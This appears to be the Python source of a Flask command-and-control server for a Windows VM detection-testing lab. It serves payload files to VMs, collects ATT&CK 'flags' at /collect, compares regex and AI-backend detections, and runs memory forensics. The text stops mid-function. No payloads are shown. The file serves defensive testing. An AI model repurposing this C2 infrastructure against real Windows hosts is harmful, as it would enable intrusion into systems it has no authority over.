#!/usr/bin/env python3
"""
MITRE ATT&CK C2 Server for Windows VM Detection Testing
Runs on Fedora, auto-detects IP, serves Windows payloads
"""

import json
import os
import socket
import subprocess
import datetime
import re
import uuid
from urllib.parse import urlparse
from pathlib import Path
from flask import Flask, request, send_file, jsonify, render_template_string
from ai_backend_client import analyze_with_backend
from flag_detection import manual_detect, summarize_detection
from forensic_analysis import (
    ForensicAnalyzer,
    load_forensic_config,
    extract_strings_from_dump,
    search_indicators,
    scan_with_yara,
    load_yara_rules,
    correlate_with_c2,
    ai_triage_artifact,
    start_forensic_task,
    get_task,
    list_tasks,
)

app = Flask(__name__)
BASE_DIR = Path(__file__).resolve().parent

# ------------------------------------------------------------
# Configuration (auto-detect IP, or use config file)
# ------------------------------------------------------------
CONFIG_FILE = BASE_DIR / "c2_config.json"
DEFAULT_CONFIG = {
    "c2_port": 8080,
    "payload_dir": "payloads",
    "log_dir": "logs",
    "flags_dir": "flags_received",
    "ai_backend_url": "http://127.0.0.1:8090/analyze",
    "ai_backend_timeout_seconds": 8,
    "ai_analysis_enabled": True,
    "host_ip": None          # Will auto-detect
}

def get_best_local_ip():
    """Return the most likely IP address for VMs to reach this host."""
    # 1. Check common bridge interfaces (libvirt default, custom bridge)
    for iface in ['virbr0', 'br0', 'docker0']:
        try:
            result = subprocess.run(['ip', 'addr', 'show', iface], capture_output=True, text=True)
            if result.returncode == 0:
                match = re.search(r'inet (\d+\.\d+\.\d+\.\d+)/', result.stdout)
                if match:
                    return match.group(1)
        except:
            pass

    # 2. Fallback: IP of default route interface
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

# Load config file if exists, but always re-detect host_ip for VM bridge
if CONFIG_FILE.exists():
    with open(CONFIG_FILE, 'r') as f:
        saved = json.load(f)
        if isinstance(saved, dict):
            # Don't load stale host_ip from config — re-detect dynamically
            saved.pop("host_ip", None)
            DEFAULT_CONFIG.update(saved)

# Always auto-detect the best IP for VMs (virbr0 > br0 > default route)
DEFAULT_CONFIG["host_ip"] = get_best_local_ip()

def configured_path(config_key):
    path = Path(DEFAULT_CONFIG[config_key])
    if path.is_absolute():
        return path
    return BASE_DIR / path


PAYLOAD_DIR = configured_path("payload_dir")
LOG_DIR = configured_path("log_dir")
FLAGS_DIR = configured_path("flags_dir")

# Ensure directories exist. Relative config paths are repository-relative so
# service behavior does not depend on the shell working directory.
for directory in [PAYLOAD_DIR, LOG_DIR, FLAGS_DIR]:
    directory.mkdir(parents=True, exist_ok=True)

# In-memory session tracking
active_sessions = {}
MANUAL_LABELS_FILE = LOG_DIR / "manual_labels.json"
FORENSIC_LABELS_FILE = LOG_DIR / "forensic_labels.json"


def load_manual_labels():
    if MANUAL_LABELS_FILE.exists():
        try:
            with open(MANUAL_LABELS_FILE, 'r') as f:
                data = json.load(f)
                if isinstance(data, dict):
                    return data
        except:
            pass
    return {}


def save_manual_labels(labels):
    with open(MANUAL_LABELS_FILE, 'w') as f:
        json.dump(labels, f, indent=2)


def load_forensic_labels():
    if FORENSIC_LABELS_FILE.exists():
        try:
            with open(FORENSIC_LABELS_FILE, 'r') as f:
                data = json.load(f)
                if isinstance(data, dict):
                    return data
        except:
            pass
    return {}


def save_forensic_labels(labels):
    with open(FORENSIC_LABELS_FILE, 'w') as f:
        json.dump(labels, f, indent=2)


def save_runtime_config():
    persisted = {}
    if CONFIG_FILE.exists():
        try:
            with open(CONFIG_FILE, 'r') as f:
                existing = json.load(f)
                if isinstance(existing, dict):
                    persisted.update(existing)
        except:
            pass

    for key in [
        "c2_port",
        "host_ip",
        "ai_backend_url",
        "ai_backend_timeout_seconds",
        "ai_analysis_enabled",
    ]:
        persisted[key] = DEFAULT_CONFIG.get(key)

    with open(CONFIG_FILE, 'w') as f:
        json.dump(persisted, f, indent=4)


def parse_backend_target(url_value):
    parsed = urlparse(url_value or "")
    return {
        "ip": parsed.hostname or "127.0.0.1",
        "port": parsed.port or 8090,
    }


def get_ai_result(text, event_id):
    if not DEFAULT_CONFIG.get("ai_analysis_enabled", True):
        return {
            "detected": False,
            "score": 0.0,
            "reasons": ["ai analysis disabled"],
            "techniques": [],
            "provider": "disabled",
            "model": "disabled",
            "mode": "disabled",
        }

    return analyze_with_backend(
        text,
        event_id,
        DEFAULT_CONFIG["ai_backend_url"],
        int(DEFAULT_CONFIG["ai_backend_timeout_seconds"]),
    )


def _event_key(entry):
    if entry.get("event_id"):
        return entry["event_id"]
    return f"{entry.get('timestamp', '')}|{entry.get('source_ip', '')}"


def apply_detection_fields(entry, labels):
    entry = dict(entry)
    details = entry.get("details", "")
    event_id = entry.get("event_id", "")
    manual = manual_detect(details)

    # AI side is provided by separate backend app.
    if "ai_detected" in entry and "ai_score" in entry:
        ai_result = {
            "detected": bool(entry.get("ai_detected")),
            "score": float(entry.get("ai_score", 0.0)),
            "reasons": entry.get("ai_reasons", []),
            "techniques": entry.get("ai_techniques", []),
            "provider": entry.get("ai_provider", "unknown"),
            "model": entry.get("ai_model", "unknown"),
            "mode": entry.get("ai_mode", "model"),
        }
    else:
        ai_result = get_ai_result(details, event_id)

    entry["ai_detected"] = ai_result["detected"]
    entry["ai_score"] = ai_result["score"]
    entry["ai_reasons"] = ai_result["reasons"]
    entry["ai_techniques"] = ai_result["techniques"]
    entry["ai_provider"] = ai_result["provider"]
    entry["ai_model"] = ai_result["model"]
    entry["ai_mode"] = ai_result["mode"]

    # Manual side prefers external analyst/tool labels.
    label = labels.get(_event_key(entry), {})
    if "detected" in label:
        entry["manual_detected"] = bool(label.get("detected"))
        entry["manual_source"] = label.get("tool", "external")
        entry["manual_notes"] = label.get("notes", "")
        entry["manual_techniques"] = label.get("techniques", [])
    else:
        entry["manual_detected"] = manual["detected"]
        entry["manual_source"] = "fallback-regex"
        entry["manual_notes"] = "No external analyst verdict yet"
        entry["manual_techniques"] = manual["techniques"]

    entry["agreement"] = entry["manual_detected"] == entry["ai_detected"]
    return entry

# ------------------------------------------------------------
# HTML Dashboard
# ------------------------------------------------------------
DASHBOARD_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <title>MITRE ATT&CK C2 Dashboard</title>
    <style>
        body { font-family: monospace; margin: 20px; background: #1e1e1e; color: #d4d4d4; }
        h1 { color: #4ec9b0; }
        .container { max-width: 1200px; margin: auto; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { text-align: left; padding: 8px; border-bottom: 1px solid #3e3e3e; }
        th { background: #2d2d2d; color: #4ec9b0; }
        .flag { color: #ce9178; }
        .timestamp { color: #6a9955; }
        .endpoint { color: #9cdcfe; }
        .payload-list a { color: #4ec9b0; text-decoration: none; }
        .payload-list a:hover { text-decoration: underline; }
        .settings-card { border: 1px solid #3e3e3e; padding: 12px; margin-top: 20px; background: #252525; }
        .settings-grid { display: grid; grid-template-columns: repeat(4, minmax(140px, 1fr)); gap: 8px; }
        .settings-grid input { background: #1d1d1d; color: #d4d4d4; border: 1px solid #4a4a4a; padding: 6px; }
        .settings-grid button { background: #007f6b; color: #fff; border: 0; padding: 8px; cursor: pointer; }
        .settings-grid button.stop { background: #8a3b3b; }
        .settings-grid button.test { background: #385e8a; }
        #ai-settings-status { margin-top: 8px; color: #dcdcaa; min-height: 20px; }
    </style>
</head>
<body>
<div class="container">
    <h1>🎯 MITRE ATT&CK C2 Server</h1>
    <p>Host IP: <strong>{{ host_ip }}:{{ port }}</strong> | VM Bridge Network</p>

    <div class="settings-card">
        <h2>⚙ AI Backend Settings</h2>
        <div class="settings-grid">
            <input id="ai-backend-ip" placeholder="AI Backend IP" value="{{ ai_backend_ip }}" />
            <input id="ai-backend-port" placeholder="Port" value="{{ ai_backend_port }}" />
            <input id="ai-timeout" placeholder="Timeout (s)" value="{{ ai_backend_timeout_seconds }}" />
            <button onclick="saveAiSettings()">Save IP/Port</button>
            <button onclick="startAiAnalysis()">Start AI Analysis</button>
            <button class="stop" onclick="stopAiAnalysis()">Stop AI Analysis</button>
            <button class="test" onclick="testAiBackend()">Test Backend</button>
            <div>Current: {{ 'enabled' if ai_analysis_enabled else 'disabled' }}</div>
        </div>
        <div id="ai-settings-status"></div>
    </div>

    <div class="settings-card">
        <h2>🖥 VM Payload Commands</h2>
        <p>Copy-paste PowerShell commands for the Windows VM (IP: <strong>{{ host_ip }}</strong>)</p>
        <div class="settings-grid">
            <button onclick="window.open('/vm-commands','_blank')">Open VM Commands Page</button>
        </div>
    </div>

    <h2>📊 Received Flags (Last 50)</h2>
    <table>
        <tr><th>Timestamp</th><th>Source IP</th><th>Technique</th><th>Manual</th><th>Manual Source</th><th>AI</th><th>AI Backend</th><th>Details</th></tr>
        {% for entry in logs %}
        <tr>
            <td class="timestamp">{{ entry.timestamp }}</td>
            <td>{{ entry.source_ip }}</td>
            <td class="flag">{{ entry.technique }}</td>
            <td>{{ 'yes' if entry.manual_detected else 'no' }}</td>
            <td>{{ entry.manual_source }}</td>
            <td>{{ 'yes' if entry.ai_detected else 'no' }} ({{ entry.ai_score }})</td>
            <td>{{ entry.ai_provider }}/{{ entry.ai_model }} ({{ entry.ai_mode }})</td>
            <td>{{ entry.details[:80] }}{% if entry.details|length > 80 %}...{% endif %}</td>
        </tr>
        {% endfor %}
    </table>

    <h2>🤖 AI vs Manual Comparison</h2>
    <table>
        <tr><th>Total</th><th>Manual Hits</th><th>AI Hits</th><th>Agreement</th><th>Manual Only</th><th>AI Only</th><th>Neither</th></tr>
        <tr>
            <td>{{ detection_summary.total }}</td>
            <td>{{ detection_summary.manual_detected }}</td>
            <td>{{ detection_summary.ai_detected }}</td>
            <td>{{ detection_summary.agreement }} ({{ detection_summary.agreement_rate }})</td>
            <td>{{ detection_summary.manual_only }}</td>
            <td>{{ detection_summary.ai_only }}</td>
            <td>{{ detection_summary.neither }}</td>
        </tr>
    </table>

    <h2>⚠ Disagreements (Latest 20)</h2>
    <table>
        <tr><th>Timestamp</th><th>Source IP</th><th>Manual</th><th>AI</th><th>AI Score</th><th>Excerpt</th></tr>
        {% for row in detection_summary.disagreements %}
        <tr>
            <td class="timestamp">{{ row.timestamp }}</td>
            <td>{{ row.source_ip }}</td>
            <td>{{ 'yes' if row.manual_detected else 'no' }}</td>
            <td>{{ 'yes' if row.ai_detected else 'no' }}</td>
            <td>{{ row.ai_score }}</td>
            <td>{{ row.excerpt }}</td>
        </tr>
        {% endfor %}
    </table>

    <h2>📦 Windows Payloads</h2>
    <div class="payload-list">
        <ul>
        {% for payload in payloads %}
            <li><a href="/get/{{ payload }}">{{ payload }}</a> - <span class="endpoint">GET /get/{{ payload }}</span></li>
        {% endfor %}
        </ul>
    </div>

    <h2>🔌 C2 Endpoints</h2>
    <ul>
        <li><span class="endpoint">POST /collect</span> - Receive flags from Windows VMs</li>
        <li><span class="endpoint">GET /get/&lt;filename&gt;</span> - Download Windows payloads</li>
        <li><span class="endpoint">GET /dashboard</span> - This dashboard</li>
        <li><span class="endpoint">GET /api/flags</span> - JSON API</li>
        <li><span class="endpoint">POST /manual/label</span> - Attach external manual verdict (Volatility/IR)</li>
        <li><span class="endpoint">GET /vm-commands</span> - <a href="/vm-commands">Copy-paste PowerShell commands for VM</a></li>
        <li><span class="endpoint">AI Backend URL</span> - {{ ai_backend_url }}</li>
        <li><span class="endpoint">GET /status</span> - Health check</li>
    </ul>

    <h2>🔬 Forensic Memory Analysis</h2>
    <div class="settings-card">
        <h3>⚙ Run Analysis on Memory Dump</h3>
        <div class="settings-grid">
            <input id="dump-path" placeholder="/path/to/memory.raw" value="" style="grid-column: span 2;" />
            <input id="target-pid" placeholder="PID (optional)" value="" />
            <button onclick="runForensicAnalyzeAsync()">🔬 Start Async Analyze</button>
            <button class="test" onclick="runForensicStrings()">📄 Strings</button>
            <button class="test" onclick="runForensicYara()">🎯 YARA</button>
            <button onclick="runForensicCorrelate()">🔗 Correlate C2</button>
            <button onclick="loadForensicReports()">📁 Reports</button>
            <button onclick="loadForensicTasks()">⏳ Tasks</button>
        </div>
        {% if available_dumps %}
        <div style="margin-top:8px; font-size:12px; color:#858585;">
            Available dumps:
            {% for d in available_dumps %}
            <a href="javascript:void(0)" onclick="document.getElementById('dump-path').value='{{ d }}'" style="color:#4ec9b0; text-decoration:underline; margin-right:10px;">{{ d.split('/')[-1] }}</a>
            {% endfor %}
        </div>
        {% endif %}
        <div id="forensic-status" style="margin-top:8px; color:#dcdcaa; min-height:20px;"></div>
        <div id="forensic-progress-bar" style="display:none; margin-top:10px; background:#1d1d1d; border:1px solid #3e3e3e; height:20px; width:100%;">
            <div id="forensic-progress-fill" style="background:#007f6b; height:100%; width:0%; transition:width 0.3s;"></div>
        </div>
    </div>

    <div id="forensic-tasks" style="display:none; margin-top:20px;">
        <h3>⏳ Analysis Tasks</h3>
        <table>
            <tr><th>Task ID</th><th>Status</th><th>Progress</th><th>Message</th><th>Dump</th></tr>
            <tbody id="forensic-tasks-body"></tbody>
        </table>
    </div>

    <div id="forensic-results" style="display:none; margin-top:20px;">
        <h3>📊 Analysis Results</h3>
        <div id="forensic-summary" style="margin-bottom:20px;"></div>
        <div id="forensic-findings" style="margin-bottom:20px;"></div>
        <div id="forensic-prioritized" style="margin-bottom:20px;"></div>
        <div id="forensic-strings" style="margin-bottom:20px;"></div>
        <div id="forensic-yara" style="margin-bottom:20px;"></div>
        <div id="forensic-correlation" style="margin-bottom:20px;"></div>
        <pre id="forensic-raw" style="background:#1d1d1d; padding:12px; overflow:auto; max-height:400px; border:1px solid #3e3e3e;"></pre>
    </div>

    <h2>📁 Forensic Reports</h2>
    <table>
        <tr><th>Name</th><th>Size</th><th>Modified</th><th>Path</th></tr>
        {% for r in forensic_reports %}
        <tr>
            <td><a href="javascript:void(0)" onclick="loadReportDetail('{{ r.name }}')">{{ r.name }}</a></td>
            <td>{{ r.size }}</td>
            <td class="timestamp">{{ r.mtime }}</td>
            <td>{{ r.path }}</td>
        </tr>
        {% endfor %}
    </table>

    <h2>💻 Active VM Sessions</h2>
    <table>
        <tr><th>VM IP</th><th>First Seen</th><th>Last Seen</th><th>Techniques</th></tr>
        {% for ip, session in sessions.items() %}
        <tr>
            <td>{{ ip }}</td>
            <td class="timestamp">{{ session.first_seen }}</td>
            <td class="timestamp">{{ session.last_seen }}</td>
            <td>{{ session.techniques|join(', ') }}</td>
        </tr>
        {% endfor %}
    </table>
</div>
<script>
async function postJson(url, body) {
    const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body || {})
    });
    return response.json();
}

function setStatus(message) {
    document.getElementById('ai-settings-status').textContent = message;
}
function setForensicStatus(message) {
    document.getElementById('forensic-status').textContent = message;
}

async function saveAiSettings() {
    const ip = document.getElementById('ai-backend-ip').value.trim();
    const port = document.getElementById('ai-backend-port').value.trim();
    const timeout = document.getElementById('ai-timeout').value.trim();
    const result = await postJson('/api/settings/ai', { ip, port, timeout });
    setStatus(result.message || JSON.stringify(result));
}

async function startAiAnalysis() {
    const result = await postJson('/api/settings/ai/start', {});
    setStatus(result.message || JSON.stringify(result));
}

async function stopAiAnalysis() {
    const result = await postJson('/api/settings/ai/stop', {});
    setStatus(result.message || JSON.stringify(result));
}

async function testAiBackend() {
    const result = await postJson('/api/settings/ai/test', {
        text: 'FLAG{T1059.001-powershell-execution}'
    });
    setStatus(result.message || JSON.stringify(result));
}

// Forensic analysis UI handlers
function showForensicResults(data) {
    document.getElementById('forensic-results').style.display = 'block';
    document.getElementById('forensic-raw').textContent = JSON.stringify(data, null, 2);

    // Prioritized processes
    const prioritized = data.report && data.report.phases && data.report.phases.prioritized_processes ? data.report.phases.prioritized_processes : [];
    let procHtml = '<h4>🔍 Prioritized Processes</h4>';
    if (prioritized.length) {
        procHtml += '<table><tr><th>PID</th><th>Name</th><th>Score</th><th>Reasons</th></tr>';
        for (const p of prioritized.slice(0, 10)) {
            procHtml += `<tr><td>${p.pid}</td><td>${p.name}</td><td>${p.score.toFixed(2)}</td><td>${p.reasons.join('; ')}</td></tr>`;
        }
        procHtml += '</table>';
    } else {
        procHtml += '<p>No prioritized processes found.</p>';
    }
    document.getElementById('forensic-prioritized').innerHTML = procHtml;

    // Strings
    const stringsPhase = data.report && data.report.phases && data.report.phases.strings ? data.report.phases.strings : {};
    let strHtml = `<h4>📄 Strings (${stringsPhase.total_strings || 0}) — Indicator Hits: ${(stringsPhase.indicator_hits || []).length}</h4>`;
    if ((stringsPhase.indicator_hits || []).length) {
        strHtml += '<table><tr><th>String</th><th>Pattern</th></tr>';
        for (const h of stringsPhase.indicator_hits.slice(0, 20)) {
            strHtml += `<tr><td style="word-break:break-all;">${h.string}</td><td>${h.pattern}</td></tr>`;
        }
        strHtml += '</table>';
    }
    document.getElementById('forensic-strings').innerHTML = strHtml;

    // YARA
    const yaraPhase = data.report && data.report.phases && data.report.phases.yara ? data.report.phases.yara : {};
    let yaraHtml = `<h4>🎯 YARA Matches: ${(yaraPhase.matches || []).length}</h4>`;
    if ((yaraPhase.matches || []).length) {
        yaraHtml += '<table><tr><th>Rule</th><th>File</th><th>Strings</th></tr>';
        for (const m of yaraPhase.matches) {
            const sids = (m.strings || []).map(s => s.identifier).join(', ');
            yaraHtml += `<tr><td>${m.rule}</td><td>${m.file}</td><td>${sids}</td></tr>`;
        }
        yaraHtml += '</table>';
    }
    document.getElementById('forensic-yara').innerHTML = yaraHtml;

    // Correlation
    const corrPhase = data.report && data.report.phases && data.report.phases.correlation ? data.report.phases.correlation : {};
    let corrHtml = `<h4>🔗 C2 Correlations: ${(corrPhase.correlations || []).length}</h4>`;
    if ((corrPhase.correlations || []).length) {
        corrHtml += '<table><tr><th>Technique</th><th>Score</th><th>Reasons</th></tr>';
        for (const c of corrPhase.correlations.slice(0, 10)) {
            corrHtml += `<tr><td>${c.c2_event.technique || '?'}</td><td>${c.correlation_score}</td><td>${c.reasons.join('; ')}</td></tr>`;
        }
        corrHtml += '</table>';
    }
    document.getElementById('forensic-correlation').innerHTML = corrHtml;

    // Findings (enhanced human-readable)
    const findings = data.report && data.report.findings ? data.report.findings : [];
    const summary = data.report && data.report.summary ? data.report.summary : {};
    let findingsHtml = `<h4>🔍 Findings (${findings.length}) — Critical: ${summary.critical || 0}, High: ${summary.high || 0}, Medium: ${summary.medium || 0}</h4>`;
    if (findings.length) {
        findingsHtml += '<table><tr><th>Severity</th><th>Type</th><th>What</th><th>Where</th><th>Why</th><th>Manual</th></tr>';
        for (let i = 0; i < findings.length; i++) {
            const f = findings[i];
            const color = f.severity === 'critical' ? '#ce9178' : f.severity === 'high' ? '#dcdcaa' : f.severity === 'medium' ? '#9cdcfe' : '#6a9955';
            const manualBtn = `<button class="copy-btn" onclick="labelFinding('${data.report_name || ''}', ${i}, true)">✓ Yes</button> <button class="copy-btn" onclick="labelFinding('${data.report_name || ''}', ${i}, false)">✗ No</button>`;
            findingsHtml += `<tr><td style="color:${color}">${f.severity}</td><td>${f.type}</td><td style="word-break:break-all;">${f.what}</td><td>${f.where}</td><td>${f.why}</td><td>${manualBtn}</td></tr>`;
        }
        findingsHtml += '</table>';
    }
    document.getElementById('forensic-findings').innerHTML = findingsHtml;
}

let _pollInterval = null;

async function runForensicAnalyzeAsync() {
    const path = document.getElementById('dump-path').value.trim();
    const pid = document.getElementById('target-pid').value.trim();
    if (!path) { setForensicStatus('Enter a dump path'); return; }
    setForensicStatus('Starting async forensic analysis...');
    document.getElementById('forensic-progress-bar').style.display = 'block';
    document.getElementById('forensic-progress-fill').style.width = '0%';
    const result = await postJson('/forensic/analyze-async', { dump_path: path, pid: pid ? parseInt(pid) : null });
    if (result.error) { setForensicStatus('Error: ' + result.error); return; }
    setForensicStatus('Analysis running. Task ID: ' + result.task_id);
    pollTask(result.task_id);
}

function pollTask(taskId) {
    if (_pollInterval) clearInterval(_pollInterval);
    _pollInterval = setInterval(async () => {
        const resp = await fetch('/forensic/tasks/' + taskId);
        const data = await resp.json();
        const task = data.task;
        if (!task) return;
        setForensicStatus(task.message + ' (' + task.progress + '%)');
        document.getElementById('forensic-progress-fill').style.width = task.progress + '%';
        if (task.status === 'completed') {
            clearInterval(_pollInterval);
            setForensicStatus('Analysis complete! Report: ' + task.report_path);
            document.getElementById('forensic-progress-bar').style.display = 'none';
            showForensicResults({report: task.report, report_name: task.report_path.split('/').pop()});
        } else if (task.status === 'error') {
            clearInterval(_pollInterval);
            setForensicStatus('Error: ' + task.message);
            document.getElementById('forensic-progress-bar').style.display = 'none';
        }
    }, 1500);
}

async function loadForensicTasks() {
    const resp = await fetch('/forensic/tasks');
    const data = await resp.json();
    const tbody = document.getElementById('forensic-tasks-body');
    tbody.innerHTML = '';
    for (const t of data.tasks.slice(0, 10)) {
        const row = document.createElement('tr');
        row.innerHTML = `<td>${t.id.substring(0,8)}</td><td>${t.status}</td><td>${t.progress}%</td><td>${t.message}</td><td>${t.dump_path ? t.dump_path.split('/').pop() : ''}</td>`;
        tbody.appendChild(row);
    }
    document.getElementById('forensic-tasks').style.display = 'block';
}

async function loadReportDetail(reportName) {
    const resp = await fetch('/forensic/report/' + encodeURIComponent(reportName));
    const data = await resp.json();
    if (data.error) { setForensicStatus(data.error); return; }
    document.getElementById('forensic-results').style.display = 'block';
    showForensicResults({report: data.report, report_name: reportName});
}

async function labelFinding(reportName, findingIndex, detected) {
    const result = await postJson('/forensic/label', {
        report_name: reportName,
        finding_index: findingIndex,
        detected: detected,
    });
    if (result.status === 'saved') {
        setForensicStatus('Label saved');
        loadReportDetail(reportName);
    }
}

async function runForensicStrings() {
    const path = document.getElementById('dump-path').value.trim();
    if (!path) { setForensicStatus('Enter a dump path'); return; }
    setForensicStatus('Extracting strings...');
    const result = await postJson('/forensic/strings', { dump_path: path });
    if (result.error) { setForensicStatus('Error: ' + result.error); return; }
    setForensicStatus(`Strings: ${result.total_strings}, indicators: ${result.indicator_hits.length}`);
    document.getElementById('forensic-results').style.display = 'block';
    document.getElementById('forensic-raw').textContent = JSON.stringify(result, null, 2);
}

async function runForensicYara() {
    const path = document.getElementById('dump-path').value.trim();
    if (!path) { setForensicStatus('Enter a dump path'); return; }
    setForensicStatus('Running YARA scan...');
    const result = await postJson('/forensic/yara', { target_path: path });
    if (result.error) { setForensicStatus('Error: ' + result.error); return; }
    setForensicStatus(`YARA matches: ${result.matches.length}`);
    document.getElementById('forensic-results').style.display = 'block';
    document.getElementById('forensic-raw').textContent = JSON.stringify(result, null, 2);
}

async function runForensicCorrelate() {
    setForensicStatus('Correlating with C2 logs...');
    const result = await postJson('/forensic/correlate', {});
    setForensicStatus(`C2 events: ${result.correlation.c2_events_count}, correlations: ${result.correlation.correlations.length}`);
    document.getElementById('forensic-results').style.display = 'block';
    document.getElementById('forensic-raw').textContent = JSON.stringify(result, null, 2);
}

async function loadForensicReports() {
    setForensicStatus('Loading reports...');
    const resp = await fetch('/forensic/reports');
    const result = await resp.json();
    setForensicStatus(`Reports loaded: ${result.reports.length}`);
    document.getElementById('forensic-results').style.display = 'block';
    document.getElementById('forensic-raw').textContent = JSON.stringify(result, null, 2);
}
</script>
</body>
</html>
'''

# ------------------------------------------------------------
# Routes
# ------------------------------------------------------------
@app.route('/')
@app.route('/dashboard')
def dashboard():
    # Read last 50 log entries
    logs = []
    labels = load_manual_labels()
    log_file = LOG_DIR / "c2_log.json"
    if log_file.exists():
        with open(log_file, 'r') as f:
            for line in f:
                try:
                    entry = json.loads(line)
                    logs.append(apply_detection_fields(entry, labels))
                except:
                    pass
    logs = logs[-50:]
    detection_summary = summarize_detection(logs)

    payloads = [f.name for f in PAYLOAD_DIR.iterdir() if f.is_file()]
    backend = parse_backend_target(DEFAULT_CONFIG["ai_backend_url"])

    # Load forensic reports for dashboard
    forensic_reports = []
    output_dir = Path(load_forensic_config().get("output_dir",
                                                  str(BASE_DIR / "forensic_output")))
    if output_dir.exists():
        for f in sorted(output_dir.glob("forensic_report_*.json"), reverse=True)[:20]:
            try:
                stat = f.stat()
                forensic_reports.append({
                    "name": f.name,
                    "path": str(f),
                    "size": stat.st_size,
                    "mtime": datetime.datetime.fromtimestamp(stat.st_mtime).isoformat(),
                })
            except Exception:
                continue

    # Load available memory dumps for quick-select
    dumps_dir = BASE_DIR / "lab" / "dumps"
    available_dumps = []
    if dumps_dir.exists():
        for f in sorted(dumps_dir.glob("*.raw"), reverse=True)[:10]:
            available_dumps.append(str(f))

    return render_template_string(DASHBOARD_HTML,
                                  logs=logs,
                                  detection_summary=detection_summary,
                                  payloads=payloads,
                                  sessions=active_sessions,
                                  ai_backend_url=DEFAULT_CONFIG["ai_backend_url"],
                                  ai_backend_ip=backend["ip"],
                                  ai_backend_port=backend["port"],
                                  ai_backend_timeout_seconds=DEFAULT_CONFIG["ai_backend_timeout_seconds"],
                                  ai_analysis_enabled=DEFAULT_CONFIG.get("ai_analysis_enabled", True),
                                  host_ip=DEFAULT_CONFIG["host_ip"],
                                  port=DEFAULT_CONFIG["c2_port"],
                                  forensic_reports=forensic_reports,
                                  available_dumps=available_dumps)

@app.route('/status')
def status():
    return jsonify({
        "status": "online",
        "host_ip": DEFAULT_CONFIG["host_ip"],
        "port": DEFAULT_CONFIG["c2_port"],
        "payloads_available": len([p for p in PAYLOAD_DIR.iterdir() if p.is_file()]),
        "active_sessions": len(active_sessions)
    })

@app.route('/collect', methods=['POST'])
def collect():
    source_ip = request.remote_addr
    flag_data = request.get_data(as_text=True)
    timestamp = datetime.datetime.now().isoformat()

    manual = manual_detect(flag_data)

    # Keep old behavior for manual extraction, with AI fallback for partial flags.
    technique = "Unknown"
    if manual["techniques"]:
        technique = manual["techniques"][0]

    event_id = str(uuid.uuid4())
    ai_result = get_ai_result(flag_data, event_id)

    if technique == "Unknown" and ai_result.get("techniques"):
        technique = ai_result["techniques"][0]

    # Log to JSON file
    log_entry = {
        "event_id": event_id,
        "timestamp": timestamp,
        "source_ip": source_ip,
        "technique": technique,
        "details": flag_data[:200],
        "ai_detected": ai_result["detected"],
        "ai_score": ai_result["score"],
        "ai_reasons": ai_result["reasons"],
        "ai_techniques": ai_result["techniques"],
        "ai_provider": ai_result["provider"],
        "ai_model": ai_result["model"],
        "ai_mode": ai_result["mode"],
    }
    log_file = LOG_DIR / "c2_log.json"
    with open(log_file, 'a') as f:
        f.write(json.dumps(log_entry) + '\n')

    # Save raw flag to separate file
    flag_file = FLAGS_DIR / f"flag_{timestamp.replace(':', '-')}_{source_ip.replace('.', '_')}.txt"
    with open(flag_file, 'w') as f:
        f.write(f"Timestamp: {timestamp}\nSource IP: {source_ip}\nTechnique: {technique}\nData: {flag_data}\n")

    # Update session tracking
    if source_ip not in active_sessions:
        active_sessions[source_ip] = {
            "first_seen": timestamp,
            "last_seen": timestamp,
            "techniques": []
        }
    else:
        active_sessions[source_ip]["last_seen"] = timestamp

    if technique not in active_sessions[source_ip]["techniques"]:
        active_sessions[source_ip]["techniques"].append(technique)

    print(f"\033[92m[+] {timestamp} | {source_ip} | {technique}\033[0m")
    print(f"    {flag_data[:100]}")

    return jsonify({
        "status": "logged",
        "event_id": log_entry["event_id"],
        "technique": technique,
        "manual_detected": manual["detected"],
        "ai_detected": ai_result["detected"],
        "ai_score": ai_result["score"],
        "ai_provider": ai_result["provider"],
        "ai_model": ai_result["model"],
        "ai_mode": ai_result["mode"],
        "agreement": manual["detected"] == ai_result["detected"],
    })


@app.route('/api/settings/ai', methods=['POST'])
def api_settings_ai():
    payload = request.get_json(silent=True) or {}
    ip = str(payload.get("ip", "")).strip()
    port = str(payload.get("port", "8090")).strip()
    timeout = str(payload.get("timeout", DEFAULT_CONFIG["ai_backend_timeout_seconds"]))

    if not re.match(r'^\d+\.\d+\.\d+\.\d+$', ip):
        return jsonify({"status": "error", "message": "Invalid IP format"}), 400

    if not port.isdigit():
        return jsonify({"status": "error", "message": "Port must be numeric"}), 400

    timeout_int = int(timeout)
    if timeout_int < 1 or timeout_int > 120:
        return jsonify({"status": "error", "message": "Timeout must be between 1 and 120 seconds"}), 400

    DEFAULT_CONFIG["ai_backend_url"] = f"http://{ip}:{int(port)}/analyze"
    DEFAULT_CONFIG["ai_backend_timeout_seconds"] = timeout_int
    save_runtime_config()

    return jsonify({
        "status": "ok",
        "ai_backend_url": DEFAULT_CONFIG["ai_backend_url"],
        "message": f"Saved AI backend to {DEFAULT_CONFIG['ai_backend_url']}"
    })


@app.route('/api/settings/ai/start', methods=['POST'])
def api_settings_ai_start():
    DEFAULT_CONFIG["ai_analysis_enabled"] = True
    save_runtime_config()
    return jsonify({
        "status": "ok",
        "message": "AI analysis enabled"
    })


@app.route('/api/settings/ai/stop', methods=['POST'])
def api_settings_ai_stop():
    DEFAULT_CONFIG["ai_analysis_enabled"] = False
    save_runtime_config()
    return jsonify({
        "status": "ok",
        "message": "AI analysis disabled"
    })


@app.route('/api/settings/ai/test', methods=['POST'])
def api_settings_ai_test():
    payload = request.get_json(silent=True) or {}
    sample_text = payload.get("text", "FLAG{T1059.001-powershell-execution}")
    test_result = analyze_with_backend(
        sample_text,
        "dashboard-test",
        DEFAULT_CONFIG["ai_backend_url"],
        int(DEFAULT_CONFIG["ai_backend_timeout_seconds"]),
    )
    return jsonify({
        "status": "ok",
        "message": (
            f"Test result: detected={test_result['detected']} "
            f"score={test_result['score']} mode={test_result['mode']}"
        ),
        "result": test_result,
    })


@app.route('/manual/label', methods=['POST'])
def manual_label():
    payload = request.get_json(silent=True) or {}
    event_id = payload.get("event_id")
    timestamp = payload.get("timestamp")
    source_ip = payload.get("source_ip")
    detected = payload.get("detected")
    tool = payload.get("tool", "external")
    techniques = payload.get("techniques", [])
    notes = payload.get("notes", "")

    if detected is None:
